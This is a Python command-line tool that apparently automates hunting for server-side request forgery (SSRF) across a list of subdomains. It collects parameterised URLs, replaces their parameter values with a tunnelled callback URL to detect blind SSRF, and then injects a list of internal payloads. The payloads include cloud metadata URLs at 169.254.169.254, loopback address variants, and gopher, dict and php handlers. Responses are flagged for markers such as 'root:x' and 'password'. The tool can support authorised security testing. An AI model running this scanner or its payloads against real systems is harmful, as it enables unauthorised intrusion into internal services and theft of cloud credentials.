import asyncio
import click
import os
import subprocess
import time
import threading
import json
import psutil
from colorama import init, Fore, Style
from src.url_processor import URLProcessor
from src.ssrf_tester import SSRFTester
from src.callback_server import CallbackServer
from src.database import Database
from config import Config

# Initialize colorama
init()

def print_banner():
    banner = f"""
{Fore.CYAN}
 ███████╗███████╗██████╗ ███████╗    ██████╗ ███████╗████████╗███████╗ ██████╗████████╗ ██████╗ ██████╗ 
 ██╔════╝██╔════╝██╔══██╗██╔════╝    ██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
 ███████╗███████╗██████╔╝█████╗      ██║  ██║█████╗     ██║   █████╗  ██║        ██║   ██║   ██║██████╔╝
 ╚════██║╚════██║██╔══██╗██╔══╝      ██║  ██║██╔══╝     ██║   ██╔══╝  ██║        ██║   ██║   ██║██╔══██╗
 ███████║███████║██║  ██║██║         ██████╔╝███████╗   ██║   ███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║
 ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝         ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
{Style.RESET_ALL}
{Fore.YELLOW}                        Advanced SSRF Detection Tool v1.0 - Local + Public IP{Style.RESET_ALL}
"""
    print(banner)

def check_tools():
    """Check if required tools are installed"""
    config = Config()
    tools = {
        "gauplus": config.GAUPLUS_PATH,
        "qsreplace": config.QSREPLACE_PATH,
        "httpx": config.HTTPX_PATH
    }
    missing_tools = []
    for name, path in tools.items():
        try:
            subprocess.run([path, "--help"], capture_output=True, timeout=5)
            print(f"✅ {name}: Found")
        except (FileNotFoundError, subprocess.TimeoutExpired):
            missing_tools.append(name)
            print(f"❌ {name}: Not found")
    if missing_tools:
        print(f"\n{Fore.RED}Missing tools: {', '.join(missing_tools)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Install them with:{Style.RESET_ALL}")
        install_commands = {
            "gauplus": "go install github.com/bp0lr/gauplus@latest",
            "qsreplace": "go install github.com/tomnomnom/qsreplace@latest",
            "httpx": "go install github.com/projectdiscovery/httpx/cmd/httpx@latest"
        }
        for tool in missing_tools:
            print(f"  {install_commands.get(tool, f'Install {tool}')}")
        return False
    return True

def get_cloudflared_public_url():
    """Get the public Cloudflared tunnel URL from the process output"""
    import re
    try:
        with open("cloudflared.log", "r") as f:
            for line in f:
                match = re.search(r"https://[\w-]+\.trycloudflare.com", line)
                if match:
                    return match.group(0)
    except Exception:
        pass
    return None

def start_cloudflared_tunnel(port):
    """Start Cloudflared tunnel for the callback server"""
    import subprocess
    print(f"{Fore.YELLOW}🌐 Starting Cloudflared tunnel for port {port}...{Style.RESET_ALL}")
    with open("cloudflared.log", "w") as log_file:
        process = subprocess.Popen([
            "cloudflared", "tunnel", "--url", f"http://localhost:{port}"
        ], stdout=log_file, stderr=subprocess.STDOUT)
    # Wait for tunnel to be established
    import time
    for _ in range(10):
        time.sleep(2)
        url = get_cloudflared_public_url()
        if url:
            print(f"{Fore.GREEN}✅ Cloudflared tunnel established!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}🌐 Public URL: {url}{Style.RESET_ALL}")
            return url
    print(f"{Fore.RED}❌ Failed to get Cloudflared public URL{Style.RESET_ALL}")
    return None

@click.group()
def cli():
    """SSRF Detection Tool - Local Server + Public IP Method"""
    print_banner()

@cli.command()
@click.option('--host', default='127.0.0.1', help='Host to bind the callback server (use 127.0.0.1 for Cloudflared)')
@click.option('--port', default=9001, help='Port to bind the callback server')
@click.option('--cloudflared', is_flag=True, help='Expose server via Cloudflared tunnel')
def server(host, port, cloudflared):
    """Start the callback server with optional Cloudflared tunnel"""
    public_url = None
    if cloudflared:
        public_url = start_cloudflared_tunnel(port)
    server_instance = CallbackServer()
    print(f"\n{Fore.GREEN}🚀 Starting SSRF callback server...{Style.RESET_ALL}")
    print(f"📍 Local server: http://{host}:{port}")
    if public_url:
        print(f"🌐 Public Cloudflared URL: {public_url}")
        print(f"🔗 Callback endpoint: {public_url}/callback")
    print(f"💡 If using Cloudflared, use the above public URL as your callback endpoint.")
    server_instance.run(host=host, port=port)

@cli.command()
@click.option('--subdomains', '-s', required=True, help='Path to subdomains file')
@click.option('--output', '-o', help='Output file for results')
@click.option('--callback-url', '-c', help='Custom callback URL (default: auto-detect from Cloudflared tunnel)')
@click.option('--tools', '-t', help='Comma-separated list of tools to use for URL extraction (gauplus,gau,waybackurls,katana)', default=None)
def scan(subdomains, output, callback_url, tools):
    """Scan subdomains for SSRF vulnerabilities"""
    tool_list = [t.strip() for t in tools.split(',')] if tools else None
    if not callback_url:
        callback_url = get_cloudflared_public_url()
        if callback_url:
            callback_url = f"{callback_url}/callback"
            print(f"{Fore.GREEN}🌐 Using Cloudflared callback URL: {callback_url}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}❌ No callback URL specified and no Cloudflared tunnel found{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 Either start the server with: python main.py server --cloudflared{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 Or provide custom callback URL with: -c https://<your-tunnel>.trycloudflare.com/callback{Style.RESET_ALL}")
            return
    asyncio.run(run_scan(subdomains, output, callback_url, tool_list))

@cli.command()
def status():
    """Show server status"""
    db = Database()
    config = Config()
    print(f"{Fore.GREEN}=== SSRF Detection Server Status ==={Style.RESET_ALL}")
    # Check if callback server is running
    try:
        import requests
        response = requests.get(f"http://127.0.0.1:{config.CALLBACK_SERVER_PORT}/health", timeout=5)
        if response.status_code == 200:
            print(f"📊 Callback Server: {Fore.GREEN}✅ Running{Style.RESET_ALL} on http://127.0.0.1:{config.CALLBACK_SERVER_PORT}")
        else:
            print(f"📊 Callback Server: {Fore.YELLOW}⚠️  Unexpected response{Style.RESET_ALL}")
    except Exception:
        print(f"📊 Callback Server: {Fore.RED}❌ Not running{Style.RESET_ALL}")
    # Show vulnerability stats
    stats = db.get_stats()
    print(f"\n{Fore.CYAN}=== Vulnerability Statistics ==={Style.RESET_ALL}")
    print(f"Total Vulnerabilities: {stats['total_vulnerabilities']}")
    print(f"Unique Domains: {stats['unique_domains']}")
    print(f"Latest Discovery: {stats['latest_discovery'] or 'None'}")

@cli.command()
def setup():
    """Setup and check tool dependencies"""
    print(f"{Fore.YELLOW}🔧 Checking tool dependencies...{Style.RESET_ALL}")
    if check_tools():
        print(f"\n{Fore.GREEN}✅ All tools are installed and ready!{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}Next steps:{Style.RESET_ALL}")
        print(f"1. Start the server: {Fore.YELLOW}python main.py server --host 0.0.0.0 --port 9001{Style.RESET_ALL}")
        print(f"2. Run a scan: {Fore.YELLOW}python main.py scan -s subdomains.txt -c http://<your-public-ip>:9001/callback{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.RED}❌ Please install missing tools before proceeding{Style.RESET_ALL}")

@cli.command()
def stats():
    """Show vulnerability statistics"""
    db = Database()
    stats = db.get_stats()
    
    print(f"{Fore.GREEN}=== SSRF Detection Statistics ==={Style.RESET_ALL}")
    print(f"Total Vulnerabilities: {Fore.CYAN}{stats['total_vulnerabilities']}{Style.RESET_ALL}")
    print(f"Unique Domains: {Fore.CYAN}{stats['unique_domains']}{Style.RESET_ALL}")
    print(f"Latest Discovery: {Fore.CYAN}{stats['latest_discovery'] or 'None'}{Style.RESET_ALL}")
    
    if stats['endpoints_by_domain']:
        print(f"\n{Fore.YELLOW}📊 Vulnerabilities by Domain:{Style.RESET_ALL}")
        sorted_domains = sorted(stats['endpoints_by_domain'].items(), key=lambda x: x[1], reverse=True)
        for domain, count in sorted_domains:
            print(f"  {Fore.CYAN}{domain}{Style.RESET_ALL}: {count}")

@cli.command()
def list_vulns():
    """List all discovered vulnerabilities"""
    db = Database()
    vulns = db.load_vulnerable_endpoints()
    
    if not vulns:
        print(f"{Fore.YELLOW}No vulnerabilities found yet.{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}=== Discovered SSRF Vulnerabilities ==={Style.RESET_ALL}")
    
    for vuln in vulns:
        print(f"\n{Fore.CYAN}🎯 Vulnerability #{vuln.get('id')}{Style.RESET_ALL}")
        print(f"  Domain: {vuln.get('domain')}")
        print(f"  Vulnerable URL: {vuln.get('vulnerable_url')}")
        print(f"  Callback IP: {vuln.get('callback_ip')}")
        print(f"  Method: {vuln.get('method', 'GET')}")
        print(f"  User Agent: {vuln.get('user_agent', 'Unknown')[:80]}...")
        print(f"  Discovered: {vuln.get('discovered_at')}")
        print(f"  {'-' * 50}")

@cli.command()
def clear_data():
    """Clear all stored vulnerability data"""
    if click.confirm(f"{Fore.RED}⚠️  This will delete all stored vulnerability data. Continue?{Style.RESET_ALL}"):
        config = Config()
        
        # Remove vulnerability data
        if os.path.exists(config.VULNERABLE_ENDPOINTS_FILE):
            os.remove(config.VULNERABLE_ENDPOINTS_FILE)
            print(f"{Fore.GREEN}✅ Cleared vulnerability database{Style.RESET_ALL}")
        
        # Remove ngrok info
        if os.path.exists(config.NGROK_CONFIG_FILE):
            os.remove(config.NGROK_CONFIG_FILE)
            print(f"{Fore.GREEN}✅ Cleared ngrok configuration{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}🧹 Data cleanup completed{Style.RESET_ALL}")

async def run_scan(subdomains_file: str, output_file: str = None, callback_url: str = None, tools=None):
    """Main scanning logic: blind SSRF + internal SSRF"""
    if not os.path.exists(subdomains_file):
        print(f"{Fore.RED}❌ Error: Subdomains file not found: {subdomains_file}{Style.RESET_ALL}")
        return
    config = Config()
    db = Database()
    processor = URLProcessor()
    # Require callback URL for blind SSRF
    if not callback_url:
        print(f"{Fore.RED}❌ No callback URL specified. Please provide your public callback URL with -c http://<your-public-ip>:<port>/callback{Style.RESET_ALL}")
        return
    print(f"\n{Fore.GREEN}🚀 Starting SSRF scan...{Style.RESET_ALL}")
    print(f"📁 Subdomains file: {subdomains_file}")
    print(f"🔗 Callback URL: {callback_url}")
    # Step 1: Extract URLs from subdomains
    print(f"\n{Fore.YELLOW}[1/5] 🔍 Extracting URLs from subdomains...{Style.RESET_ALL}")
    all_urls = processor.extract_urls_from_subdomains(subdomains_file, tools=tools)
    if not all_urls:
        print(f"{Fore.RED}❌ No URLs found. Check your subdomains file and extraction tools.{Style.RESET_ALL}")
        return
    # Step 2: Filter URLs with parameters (URL params)
    print(f"\n{Fore.YELLOW}[2/5] 🔍 Filtering URLs with URL parameters...{Style.RESET_ALL}")
    param_urls = processor.filter_urls_with_params(all_urls)
    if not param_urls:
        print(f"{Fore.RED}❌ No URLs with URL parameters found.{Style.RESET_ALL}")
        return
    # Step 3: Blind SSRF - Replace params with callback URL
    print(f"\n{Fore.YELLOW}[3/5] 🔄 Blind SSRF: Replacing parameters with callback URL...{Style.RESET_ALL}")
    modified_urls = processor.replace_params_with_callback(param_urls, callback_url)
    if not modified_urls:
        print(f"{Fore.RED}❌ Failed to modify URLs. Check qsreplace installation.{Style.RESET_ALL}")
        return
    # Step 4: Blind SSRF - Test URLs
    print(f"\n{Fore.YELLOW}[4/5] 🚀 Testing URLs for Blind SSRF...{Style.RESET_ALL}")
    async with SSRFTester() as tester:
        results = await tester.test_urls(modified_urls)
    # Save results if output file specified
    if output_file:
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"💾 Results saved to: {output_file}")
    # Show summary
    print(f"\n{Fore.GREEN}✅ Blind SSRF scan completed!{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}📊 Summary:{Style.RESET_ALL}")
    print(f"  📄 Total URLs found: {len(all_urls)}")
    print(f"  🔗 URLs with URL parameters: {len(param_urls)}")
    print(f"  🧪 URLs tested (blind SSRF): {len(modified_urls)}")

    print(f"\n{Fore.CYAN}🎯 Monitor your callback server for SSRF hits!{Style.RESET_ALL}")
    print(f"📊 Dashboard: http://127.0.0.1:9001")
    # Step 5: Internal SSRF - Test with internal targets
    print(f"\n{Fore.YELLOW}[5/5] 🕵️ Testing URLs for Internal SSRF (localhost, metadata, exotic handlers, etc)...{Style.RESET_ALL}")
    ssrf_targets = [
        # IPv4
        "http://localhost", "http://127.0.0.1", "http://169.254.169.254", "http://0.0.0.0", "http://[::1]",
        "http://0177.1/", "http://0x7f.1/", "http://127.000.000.1", "https://520968996",
        # Exotic Handlers
        "gopher://127.0.0.1", "dict://127.0.0.1", "php://filter", "jar://127.0.0.1", "tftp://127.0.0.1",
        # IPv6
        "http://[::1]", "http://[::]",
        # Wildcard DNS
        "http://10.0.0.1.xip.io", "http://www.10.0.0.1.xip.io", "http://mysite.10.0.0.1.xip.io", "http://foo.bar.10.0.0.1.xip.io",
        # AWS Metadata
        "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/local-hostname", "http://169.254.169.254/latest/meta-data/public-hostname"
    ]
    internal_results = []
    import aiohttp
    from difflib import SequenceMatcher
    from urllib.parse import urlparse
    from tqdm import tqdm
    import asyncio
    # Helper async function for a single internal SSRF test
    async def test_internal_ssrf(url, params, baseline_status, baseline_body, ssrf_targets):
        results = []
        from urllib.parse import unquote, urlparse
        for target in ssrf_targets:
            new_params = []
            for param in params:
                key_value = param.split('=', 1)
                if len(key_value) == 2:
                    value = key_value[1]
                    decoded_value = unquote(value)
                    if decoded_value.startswith(('http://', 'https://', 'gopher://', 'dict://', 'php://', 'jar://', 'tftp://')):
                        new_params.append(f"{key_value[0]}={target}")
                    else:
                        new_params.append(param)
                else:
                    new_params.append(param)
            parsed = urlparse(url)
            new_query = '&'.join(new_params)
            new_url = url.replace(parsed.query, new_query)
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(new_url, timeout=10, allow_redirects=False) as resp:
                        status = resp.status
                        headers = dict(resp.headers)
                        body = await resp.text()
                        waf_headers = [h for h in headers if 'waf' in h.lower() or 'firewall' in h.lower()]
                        similarity = SequenceMatcher(None, baseline_body, body).ratio()
                        is_interesting = False
                        if status != baseline_status:
                            is_interesting = True
                        if similarity < 0.95:
                            is_interesting = True
                        if any(keyword in body.lower() for keyword in ["localhost", "127.0.0.1", "meta-data", "x-amz", "ec2", "internal", "root:x", "password", "admin"]):
                            is_interesting = True

                        waf_headers=False # debug should be cahnged later

                        if status == 200 and not waf_headers and is_interesting:
                            print(f"{Fore.RED}❗ Possible Internal SSRF Vulnerability: {new_url}{Style.RESET_ALL}")
                            print(f"    Status: {status} | Similarity: {similarity:.2f} | WAF: {waf_headers}")
                        results.append({
                            "url": new_url,
                            "status": status,
                            "baseline_status": baseline_status,
                            "waf_headers": waf_headers,
                            "body_snippet": body[:200],
                            "similarity": similarity,
                            "is_interesting": is_interesting
                        })
            except Exception:
                pass
        return results
    # Prepare tasks for all param_urls
    tasks = []
    for url in tqdm(param_urls, desc="Testing URLs (Internal SSRF)"):
        parsed = urlparse(url)
        params = parsed.query.split('&')
        # Make baseline request (no injection)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as resp:
                    baseline_status = resp.status
                    baseline_headers = dict(resp.headers)
                    baseline_body = await resp.text()
        except Exception:
            baseline_status = None
            baseline_headers = {}
            baseline_body = ""
        tasks.append(test_internal_ssrf(url, params, baseline_status, baseline_body, ssrf_targets))
    # Run all tasks concurrently
    all_results = await asyncio.gather(*tasks)
    for result in all_results:
        internal_results.extend(result)
    print(f"\n{Fore.GREEN}✅ Internal SSRF scan completed!{Style.RESET_ALL}")
    print(f"Total internal SSRF tests performed: {len(internal_results)}")
    # Optionally save internal SSRF results
    if output_file:
        with open(output_file.replace('.json', '_internal.json'), 'w') as f:
            json.dump(internal_results, f, indent=2)
        print(f"💾 Internal SSRF results saved to: {output_file.replace('.json', '_internal.json')}")
        
if __name__ == "__main__":
    cli()
